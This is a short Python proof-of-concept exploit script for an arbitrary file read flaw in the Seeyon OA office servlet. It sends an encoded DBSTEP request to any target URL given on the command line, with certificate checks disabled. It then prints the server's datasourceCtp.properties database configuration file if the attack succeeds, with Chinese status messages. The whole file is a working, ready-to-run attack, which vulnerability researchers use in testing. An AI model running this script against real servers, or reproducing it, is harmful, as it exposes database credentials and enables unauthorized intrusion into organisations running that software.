#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import requests
import re
import urllib3

urllib3.disable_warnings()


def verify(site):
    burp0_url = site +"/seeyon/officeservlet"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.79", "Connection": "close", "Accept-Encoding": "gzip,deflate", "Content-Type": "text/plain"}
    burp0_data = "DBSTEP V3.0     335             0               0               DBSTEP=OKMLlKlV\r\nOPTION=LKDxOWOWLlxwVlOW\r\nTEMPLATE=qfuvqfuveRWiyBDUcATRqAOJN1WicElXeAl4Nrg5drMvd1lXN1QQds66\r\nCOMMAND=BSTLOlMSOCQwOV66\r\naffairMemberId=123\r\naffairMemberName=123\r\nEXTPARAM=zLCiPLVszLwuziwiwLSGwUCuz=66\r\nRECORDID=qLwswidTwLdhP4eXwU=Xw4e3ziV6\r\nFILENAME=qLwswidTwLdhP4eXwU=Xw4e3ziOCcAw6\r\nFILETYPE=qROves66\r\nUSERNAME=Tu/qTq2O/cRF\r\nCREATEDATE=wUgXwB3szB3XzXghw4tGw4tswV66\r\nCATEGORY=wV66\r\nneedReadFile=NrMGyV66"
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    if 'ctpDataSource' in r.text and r.status_code == 200:
        return r.text
    return False

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Winows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 seeyon-officeservlet-fileread.py ",target)
    data = verify(target)
    if data:
        print("[+]漏洞存在，读取 datasourceCtp.properties 的结果为：", data)
    else:
        print("[-]漏洞不存在")
